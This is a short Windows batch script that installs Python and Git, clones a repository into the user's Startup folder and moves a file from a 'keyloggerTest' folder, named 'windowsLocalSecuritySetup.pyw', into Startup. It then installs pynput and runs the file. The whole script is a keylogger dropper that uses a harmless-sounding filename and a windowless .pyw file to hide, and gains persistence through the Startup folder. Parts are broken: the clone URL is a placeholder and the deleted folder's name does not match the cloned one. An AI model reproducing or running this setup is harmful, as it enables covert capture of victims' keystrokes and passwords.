start https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe
timeout 120
start https://github.com/git-for-windows/git/releases/download/v2.38.1.windows.1/Git-2.38.1-64-bit.exe
timeout 120
git clone url C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup 
timeout 1
cd C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
move C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\keyloggerTest\windowsLocalSecuritySetup.pyw C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
@RD /S /Q "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\repo\"

pip install pynput
python windowsLocalSecuritySetup.pyw